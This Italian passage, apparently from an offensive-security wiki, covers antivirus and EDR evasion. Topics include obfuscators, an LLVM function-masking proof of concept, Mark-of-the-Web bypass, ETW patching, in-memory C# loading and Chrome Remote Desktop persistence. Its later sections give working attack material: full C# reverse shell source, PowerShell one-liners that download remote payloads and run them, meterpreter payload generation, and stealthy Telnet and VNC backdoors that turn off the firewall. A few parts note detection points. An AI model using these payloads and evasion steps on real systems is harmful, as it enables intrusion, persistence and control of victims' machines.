   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Dopo questo passaggio dovresti osservare normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Pulizia manuale – esegui il binario risultante con dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il *payload* reale. Spesso il malware lo memorizza come array di byte codificato TLV, inizializzato all'interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza** dover eseguire il campione malevolo: è utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx genera un attributo personalizzato chiamato `ConfusedByAttribute`, che può essere usato come IOC per classificare automaticamente i campioni.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire maggiore sicurezza software tramite l'[offuscamento del codice](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e la protezione contro le manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare codice offuscato in fase di compilazione, senza strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge un livello di operazioni offuscate generate dal framework C++ template metaprogramming, rendendo un po' più difficile la vita di chi vuole craccare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscatore di binari x64 in grado di offuscare diversi tipi di file PE, tra cui .exe, .dll e .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di offuscamento del codice granulare per i linguaggi supportati da LLVM, basato su ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando le istruzioni normali in catene ROP, contrastando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un PE Crypter .NET scritto in Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli.

### Mascheramento autonomo per funzione assistito dal compilatore LLVM

Invece di mascherare un intero implant solo mentre è inattivo, un backend LLVM X86 modificato può mantenere selezionate funzioni mascherate con XOR ogni volta che sono inattive. La PoC Function Peekaboo seleziona i nomi demangled che contengono `REG_`, inserisce stub di ingresso/uscita position-independent attorno al codice macchina finale ed emette un unico handler di mascheramento condiviso in `.text`; le firme a livello sorgente e la convenzione di chiamata Windows x64 rimangono invariate.<sup>[[38]](#references)[[39]](#references)</sup>

#### Trasformazione del flusso di controllo nel backend

Questa operazione va eseguita dopo la selezione delle istruzioni e l'ottimizzazione, perché la trasformazione deve coprire **ogni return emesso** e conoscere il layout x86 esatto. Un `MachineFunctionPass` pre-emissione individua l'ultimo `MachineInstr::isReturn()`, lo elimina affinché il percorso finale prosegua nell'epilogo aggiunto e sostituisce i return precedenti con `JMP_1 handler`. Mantieni qualsiasi teardown dello stack/frame generato dal compilatore prima di ogni return; reindirizza solo l'istruzione return stessa.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `X86AsmPrinter::emitFunctionBodyEnd()` emettono gli stub per funzione, mentre `emitEndOfAsmFile()` emette l'handler. I simboli condivisi tra le fasi di emissione permettono a un branch del prologo di raggiungere il suo epilogo successivo; per un `je` near emesso manualmente, scrivi `0F 84` seguito dall'espressione MC a quattro byte `target - address_after_je`. Le chiamate e i jump all'handler possono invece essere emessi come oggetti `MCInst` (`CALL64pcrel32` e `JMP_1`). Un pass deve restituire `false` per una funzione non selezionata se non ha modificato nulla; in quel caso la PoC restituisce erroneamente `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadati e inizializzazione pre-CRT

La PoC inserisce in `.funcmeta` una chiave XOR e record da 16 byte contenenti un puntatore a funzione rilocato dal loader e una lunghezza runtime. Sebbene il campo C sia un `uint32_t`, l'handler legge un QWORD all'offset `+8` del record, includendo la lunghezza e il relativo padding, e avanza tra i record di `0x10`. I nomi delle sezioni PE sono lunghi al massimo otto byte, quindi la ricerca runtime vede `.funcmet`. Una patcher esterno aggiunge una sezione eseguibile `.stub`, salva nello stub il vecchio RVA dell'entry point e reindirizza `AddressOfEntryPoint`; lo stub PIC ricava la base dell'immagine da `gs:[0x60]` → `[PEB+0x10]`, scorre gli import PE32+ per risolvere una `VirtualProtect` già importata e viene eseguito prima del CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'inizializzazione imposta un sentinel in `gs:[0xE8]` e chiama tutte le funzioni nei metadati. Il prologo, permanentemente leggibile, registra l'inizio della funzione in `gs:[0xF0]`, rileva il sentinel e salta il corpo ancora non mascherato. L'epilogo usa quindi `call handler`; dopo che l'handler ha salvato 13 registri (`0x68` byte), l'indirizzo di ritorno in `[rsp+0x68]` corrisponde alla fine della funzione trasformata, perciò `end - start` può essere scritto nel relativo record dei metadati. Una volta mascherati tutti i corpi, lo stub cancella il sentinel e salta a `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Durante una chiamata normale, il prologo chiama lo stesso handler simmetrico per decodificare il corpo. Il percorso finale prosegue nell'epilogo aggiunto, mentre ogni return precedente salta direttamente all'handler condiviso. Anche l'epilogo normale usa `jmp handler` invece di `call`, così, dopo aver rimaskerato il corpo, il `ret` dell'handler consuma l'indirizzo di ritorno del chiamante originale e conserva il risultato della funzione in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva di mascheramento e indicatori di analisi

L'handler individua il record corrente, salta il prologo visibile di lunghezza fissa (in questa build, `0x46` byte), modifica il resto in `PAGE_EXECUTE_READWRITE`, applica XOR byte per byte usando il byte meno significativo della chiave e lo imposta poi su `PAGE_EXECUTE_READ`. Lo stesso ciclo decodifica quindi all'ingresso e codifica a ogni uscita normale.<sup>[[38]](#references)[[39]](#references)</sup>

Gli indicatori più significativi per questo design includono:<sup>[[38]](#references)[[39]](#references)</sup>

- un entry point all'interno di uno `.stub` eseguibile e una sezione `.funcmet` contenente una chiave e puntatori `.text` rilocati;
- analisi pre-CRT di PEB, tabelle degli import e tabelle delle sezioni, seguita da chiamate tramite ciascun puntatore nei metadati;
- prologhi PIC `call`/`pop` identici e numerosi return reindirizzati a un unico handler;
- scritture in `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguite da ripetute transizioni `VirtualProtect` e scritture XOR byte per byte in pagine eseguibili supportate dall'immagine.

Si tratta di evasione degli scanner di memoria, non di protezione crittografica: il file modificato contiene ancora il corpo originale in chiaro e un debugger può intercettare `VirtualProtect` o il ciclo XOR e acquisire la funzione attiva. Anche l'XOR a singolo byte, i metadati leggibili e il confine fisso `0x46` rendono semplice il recupero offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Gli slot TEB della PoC sono locali al thread, ma le pagine di codice modificate sono condivise dal processo. Un ingresso concorrente o ricorsivo può quindi invertire nuovamente le istruzioni mentre un'altra invocazione è in esecuzione; anche eccezioni e uscite non locali possono evitare il rimasking. Un'implementazione robusta deve sincronizzare le transizioni, ripristinare la protezione effettivamente restituita tramite `lpflOldProtect`, evitare lunghezze dello stub hard-coded, verificare l'allineamento dello stack x64 sia nei percorsi `call` sia in quelli `jmp` e chiamare `FlushInstructionCache` dopo aver riscritto byte eseguibili. Microsoft attribuisce esplicitamente al chiamante la responsabilità della coerenza della cache delle istruzioni quando viene modificato codice eseguibile.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen e MoTW

Potresti aver visto questa schermata scaricando ed eseguendo alcuni eseguibili da Internet.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen si basa principalmente sulla reputazione: le applicazioni scaricate raramente attivano SmartScreen, che avvisa l'utente finale e gli impedisce di eseguire il file (anche se è comunque possibile eseguirlo facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [Alternate Data Stream NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) denominato Zone.Identifier, creato automaticamente quando si scaricano file da Internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dell'ADS Zone.Identifier di un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **attendibile** **non attivano SmartScreen**.

Un modo molto efficace per evitare che i payload ricevano il Mark of The Web consiste nel racchiuderli in un contenitore, ad esempio un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che inserisce i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ecco una demo per bypassare SmartScreen impacchettando payload all'interno di file ISO con [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

Analogamente a quanto avviene quando si disabilita (bypassa) AMSI, è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente, senza registrare alcun evento. Ciò si ottiene applicando una patch alla funzione in memoria, in modo che ritorni immediatamente e disabiliti di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflection degli assembly C#

Caricare binari C# in memoria è una tecnica nota da tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza farti individuare dall'AV.

Dato che il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di applicare una patch ad AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) offre già la possibilità di eseguire assembly C# direttamente in memoria, ma esistono diversi modi per farlo:

- **Fork\&Run**

Consiste nel **creare un nuovo processo sacrificale**, iniettare il tuo codice dannoso di post-exploitation in quel processo, eseguire il codice dannoso e, al termine, terminare il nuovo processo. Questo metodo presenta vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del processo del nostro impianto Beacon. Ciò significa che, se qualcosa va storto durante l'attività di post-exploitation o veniamo individuati, c'è una **probabilità molto maggiore** che il nostro **impianto sopravviva**. Lo svantaggio è che c'è una **probabilità maggiore** di essere individuati dai **rilevamenti comportamentali**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice dannoso di post-exploitation **nel processo stesso**. In questo modo puoi evitare di creare un nuovo processo e di farlo scansionare dall'AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon**, che potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi saperne di più sul caricamento degli assembly C#, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare assembly C# **da PowerShell**: dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Repackaging di strumenti .NET in WebAssembly con NativeAOT (WasmForge)

Le normali tecniche `execute-assembly` mantengono MSIL riconoscibile e finiscono per inizializzare un CLR. **WasmForge** cambia invece l'ambiente di esecuzione: migra un progetto C# al target sperimentale NativeAOT-LLVM WASI, lo compila in anticipo in WebAssembly e incorpora il modulo in un host PE Windows basato su Wazero. Il processo risultante non ha bisogno del CLR, del JIT o dell'host `dotnet` del sistema target; pertanto, le regole basate solo sui nomi degli assembly gestiti, sul caricamento del CLR, su AMSI o su .NET ETW perdono visibilità diretta. Si tratta di una tecnica di evasione e packaging, non di un bypass dei limiti di privilegio: il guest mantiene i permessi dello strumento originale e il relativo comportamento osservabile nel sistema operativo.<sup>[[44]](#references)[[45]](#references)</sup>

### Compilare un progetto C#

Il percorso di compilazione consigliato è l'ambiente Docker del progetto, che include .NET 10 SDK, il workload NativeAOT-LLVM, WASI SDK 24.0, il linker e le dipendenze per la firma. Un file `.csproj` viene rilevato automaticamente; la compilazione in un'unica operazione esegue la migrazione, l'applicazione delle patch di compatibilità, la compilazione WASM, la creazione del PE e la firma.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Per risolvere i problemi o rivedere il codice generato, suddividi il processo in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` e una compilazione finale con `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. L’immagine di build usa anche un wrapper `wasm-component-ld` per evitare la codifica dei componenti WASI Preview 2 e generare il modulo semplice previsto dal runtime incorporato.<sup>[[44]](#references)[[45]](#references)</sup>

### Bridge da wasm32 C# a x64 Win32

Non si tratta di una ricompilazione trasparente. NativeAOT-WASI non supporta, o modifica, funzionalità BCL orientate a Windows, e un guest wasm32 alloca normalmente slot per puntatori da quattro byte, mentre le API x64 possono restituire puntatori da otto byte. WasmForge affronta entrambi i problemi con i seguenti livelli generati:<sup>[[44]](#references)</sup>

1. Un patcher del codice sorgente corregge le differenze semantiche specifiche di AOT e reindirizza le chiamate non supportate a registry, pipe, WMI, identity, directory service, versioni dei file, LSA e funzionalità simili verso helper `Wf*`.
2. Uno scanner P/Invoke genera mapping `DirectPInvoke` per NativeAOT, in modo che le chiamate `[DllImport]` si colleghino ai simboli C bridge collegati, invece di caricare dinamicamente la DLL dichiarata all’interno del guest.
3. I puntatori destinati all’host usano `ulong` in C# e `uint64_t` in C. Un dispatcher generico inoltra la chiamata all’handler Win32 dell’host; un `out8_mask` contrassegna gli slot di output autentici da otto byte, di cui è necessario conservare le metà superiori. Per gli output non contrassegnati, con struttura wasm32, viene usata una protezione snapshot/restore, così una scrittura x64 non può corrompere i quattro byte adiacenti.
4. Bridge host dedicati gestiscono le operazioni non adatte al dispatch generico delle syscall, come l’accesso alla cache dei ticket LSA, le operazioni Kerberos/BCrypt con risultati strutturati, il traffico TCP KDC e le query LDAP.

Ad esempio, un wrapper per `version.dll!VerQueryValueW` passa quattro indirizzi host e imposta i bit 2 e 3 (`0xC`), perché il puntatore al valore e la lunghezza sono slot di output da otto byte. Il wrapper rimane generico e delega il nome della DLL, il nome dell’export, gli argomenti e la maschera a `wf_call_v2`; l’host esegue la traduzione dei puntatori e invoca l’API nativa.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Limitazioni e punti di rilevamento

Il codice che fa ampio uso della reflection, il caricamento dinamico degli assembly, i callback nativi arbitrari e le strutture x64 complesse restituite nella memoria WASM possono comunque richiedere patch specifiche per ogni tool o fallire del tutto. Anche i socket generici di WASI Preview 2 possono raggiungere stub no-op, quindi i tool supportati utilizzano shim host specifici per protocollo. Convalida ogni comando confrontandolo con una build nativa, invece di presumere che le funzionalità siano equivalenti.<sup>[[44]](#references)[[45]](#references)</sup>

Questa tecnica sposta la telemetria, anziché rendere invisibile il payload. Il rilevamento può concentrarsi su un PE che contiene o materializza un modulo WASM, sul comportamento di un runtime simile a Wazero, su allocazioni e copie insolite della memoria host/guest, sul dispatch generico e diretto di Win32, su anomalie di firma e risorse PE, oltre che sulle chiamate API e sul traffico di rete risultanti. L'assenza di eventi CLR-load, AMSI o .NET ETW non dovrebbe quindi essere considerata una prova che un processo sia benigno.<sup>[[44]](#references)</sup>

## Uso di altri linguaggi di programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi, fornendo alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'Attacker**.

Fornendo accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repository indica: Defender continua a scansionare gli script, ma usando Go, Java, PHP ecc. abbiamo **maggiore flessibilità nell'eludere le firme statiche**. I test con script reverse shell casuali e non offuscati in questi linguaggi hanno avuto esito positivo.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Il token stomping manipola il token di accesso di un prodotto di sicurezza come un EDR o un AV. Ridurre i privilegi del token può lasciare il processo in esecuzione, impedendogli però di eseguire ispezioni o azioni di remediation con privilegi elevati.

Per evitarlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Uso di software attendibile

### Chrome Remote Desktop

Come descritto in [**questo post del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop sul PC di una vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scarica il programma da https://remotedesktop.google.com/, fai clic su "Set up via SSH" e poi sul file MSI per Windows per scaricarlo.
2. Esegui il programma di installazione in modalità silenziosa sulla macchina della vittima (sono richiesti i privilegi di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su next. La procedura guidata ti chiederà quindi di autorizzare; fai clic sul pulsante Authorize per continuare.
4. Esegui il comando fornito, apportando le modifiche necessarie: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (il parametro `--pin` imposta il PIN senza usare la GUI).
 

## Evasione avanzata

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

L'evasione è un argomento molto complesso; a volte bisogna tenere conto di molte fonti di telemetria diverse in un unico sistema, quindi è praticamente impossibile restare completamente inosservati in ambienti maturi.

Ogni ambiente in cui ti muovi avrà i propri punti di forza e di debolezza.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per acquisire familiarità con tecniche di evasione più avanzate.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Anche questo è un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull'evasione in profondità.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Tecniche obsolete**

### **Verificare quali parti Defender rileva come malevole**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuove parti del binario** finché **non individua quale parte Defender** rileva come malevola, separandola per te.\
Un altro tool che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), che offre il servizio tramite un'interfaccia web pubblica su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Server Telnet**

Fino a Windows 10, tutte le versioni di Windows includevano un **server Telnet** che potevi installare (come amministratore) eseguendo:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Fai in modo che **si avvii** all'avvio del sistema ed **eseguilo** ora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Cambiare la porta telnet** (stealth) e disabilitare il firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (ti servono i download dei binari, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Quindi, sposta il binario _**winvnc.exe**_ e il file _**UltraVNC.ini**_ appena creato all'interno della **vittima**

#### **Connessione inversa**

L'**attaccante** deve **eseguire all'interno del proprio** **host** il binario `vncviewer.exe -listen 5900`, così sarà **pronto** a ricevere una **connessione VNC** inversa. Poi, all'interno della **vittima**: avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth, non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti verrà visualizzato un [popup](https://i.imgur.com/1SROTTl.png). Controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per visualizzare la guida, altrimenti verrà visualizzato un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

All'interno di GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Ora **avvia il listener** con `msfconsole -r file.rc` ed **esegui** il **payload xml** con:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender attuale terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima Revershell C#

Compilarla con:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Usalo con:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# usando il compilatore

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatica:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco degli offuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di Python per creare injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
